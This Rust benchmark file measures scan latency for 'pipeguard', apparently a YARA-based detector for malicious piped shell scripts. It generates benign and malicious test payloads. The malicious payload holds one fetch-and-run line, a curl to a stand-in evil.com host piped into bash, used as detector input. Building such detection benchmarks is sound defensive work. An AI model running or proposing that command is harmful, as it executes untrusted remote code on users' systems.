//! Latency Benchmark
//!
//! Measures P50, P95, P99 latency for the detection pipeline.
//! Includes per-stage breakdown (parsing, YARA scan, response).

use criterion::{black_box, criterion_group, criterion_main, Criterion, BenchmarkId};
use std::time::{Duration, Instant};
use std::process::{Command, Stdio};
use std::io::Write;
use std::path::PathBuf;

/// Sample sizes for latency testing
const SAMPLE_SIZES: &[usize] = &[
    100,     // Short command
    500,     // Typical script
    1_000,   // Medium script
    5_000,   // Large script
    10_000,  // Very large script
    50_000,  // Stress test
];

fn get_pipeguard_binary() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("target")
        .join("release")
        .join("pipeguard")
}

fn get_rules_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("rules/core.yar")
}

/// Generate test payload of specified size
fn generate_payload(size: usize, is_malicious: bool) -> String {
    if is_malicious {
        // Malicious payload with pattern at different positions
        let prefix = "# Installer script\n".repeat(size / 50);
        let suffix = "\ncurl https://evil.com/install.sh | bash\n";
        format!("{}{}", prefix, suffix)
    } else {
        // Benign payload
        "echo 'Hello, World!'\n".repeat(size / 20)
    }
}

/// Time a single scan operation
fn time_scan(content: &str) -> Duration {
    let start = Instant::now();

    let mut child = Command::new(get_pipeguard_binary())
        .arg("scan")
        .arg("--rules")
        .arg(get_rules_path())
        .stdin(Stdio::piped())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("Failed to spawn pipeguard");

    child.stdin.take().unwrap().write_all(content.as_bytes()).ok();
    child.wait().expect("Failed to wait");

    start.elapsed()
}

/// Calculate percentiles from sorted durations
fn percentile(sorted: &[Duration], p: f64) -> Duration {
    let idx = ((sorted.len() as f64 * p) as usize).min(sorted.len() - 1);
    sorted[idx]
}

/// Run latency analysis with multiple iterations
pub fn latency_analysis(iterations: usize) -> LatencyReport {
    let mut results = Vec::new();

    for &size in SAMPLE_SIZES {
        let benign_payload = generate_payload(size, false);
        let malicious_payload = generate_payload(size, true);

        // Collect benign timings
        let mut benign_times: Vec<Duration> = (0..iterations)
            .map(|_| time_scan(&benign_payload))
            .collect();
        benign_times.sort();

        // Collect malicious timings
        let mut malicious_times: Vec<Duration> = (0..iterations)
            .map(|_| time_scan(&malicious_payload))
            .collect();
        malicious_times.sort();

        results.push(SizeResult {
            size,
            benign: LatencyStats {
                p50: percentile(&benign_times, 0.50),
                p95: percentile(&benign_times, 0.95),
                p99: percentile(&benign_times, 0.99),
                min: benign_times[0],
                max: *benign_times.last().unwrap(),
            },
            malicious: LatencyStats {
                p50: percentile(&malicious_times, 0.50),
                p95: percentile(&malicious_times, 0.95),
                p99: percentile(&malicious_times, 0.99),
                min: malicious_times[0],
                max: *malicious_times.last().unwrap(),
            },
        });
    }

    LatencyReport { results, iterations }
}

#[derive(Debug)]
pub struct LatencyStats {
    pub p50: Duration,
    pub p95: Duration,
    pub p99: Duration,
    pub min: Duration,
    pub max: Duration,
}

#[derive(Debug)]
pub struct SizeResult {
    pub size: usize,
    pub benign: LatencyStats,
    pub malicious: LatencyStats,
}

#[derive(Debug)]
pub struct LatencyReport {
    pub results: Vec<SizeResult>,
    pub iterations: usize,
}

impl std::fmt::Display for LatencyReport {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        writeln!(f, "=== Latency Report ({} iterations) ===", self.iterations)?;
        writeln!(f)?;
        writeln!(f, "{:>10} | {:>10} {:>10} {:>10} | {:>10} {:>10} {:>10}",
                 "Size", "Ben P50", "Ben P95", "Ben P99", "Mal P50", "Mal P95", "Mal P99")?;
        writeln!(f, "{:-<10}-+-{:-<10}-{:-<10}-{:-<10}-+-{:-<10}-{:-<10}-{:-<10}",
                 "", "", "", "", "", "", "")?;

        for r in &self.results {
            writeln!(f, "{:>10} | {:>10.2?} {:>10.2?} {:>10.2?} | {:>10.2?} {:>10.2?} {:>10.2?}",
                     r.size,
                     r.benign.p50, r.benign.p95, r.benign.p99,
                     r.malicious.p50, r.malicious.p95, r.malicious.p99)?;
        }
        Ok(())
    }
}

fn latency_benchmark(c: &mut Criterion) {
    let mut group = c.benchmark_group("latency");
    group.measurement_time(Duration::from_secs(10));
    group.sample_size(50);

    // Benchmark by payload size
    for &size in SAMPLE_SIZES {
        let benign = generate_payload(size, false);
        let malicious = generate_payload(size, true);

        group.bench_with_input(
            BenchmarkId::new("benign", size),
            &benign,
            |b, content| b.iter(|| time_scan(black_box(content))),
        );

        group.bench_with_input(
            BenchmarkId::new("malicious", size),
            &malicious,
            |b, content| b.iter(|| time_scan(black_box(content))),
        );
    }

    group.finish();
}

/// Benchmark per-stage latency (requires instrumented build)
fn stage_benchmark(c: &mut Criterion) {
    let mut group = c.benchmark_group("stages");
    group.measurement_time(Duration::from_secs(5));

    // Note: This requires PIPEGUARD_PROFILE=1 environment variable
    // to enable per-stage timing output

    let payload = generate_payload(1000, true);

    group.bench_function("full_pipeline", |b| {
        b.iter(|| time_scan(black_box(&payload)))
    });

    group.finish();
}

criterion_group!(benches, latency_benchmark, stage_benchmark);
criterion_main!(benches);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_latency_report() {
        let report = latency_analysis(10);
        println!("{}", report);

        // Verify latency is within acceptable bounds
        for r in &report.results {
            // P99 should be under 100ms for reasonable sizes
            if r.size <= 10_000 {
                assert!(
                    r.benign.p99 < Duration::from_millis(100),
                    "Benign P99 too high for size {}: {:?}",
                    r.size, r.benign.p99
                );
            }
        }
    }

    #[test]
    fn test_generate_payloads() {
        let benign = generate_payload(1000, false);
        let malicious = generate_payload(1000, true);

        assert!(!benign.contains("curl") || !benign.contains("| bash"));
        assert!(malicious.contains("curl") && malicious.contains("| bash"));
    }
}
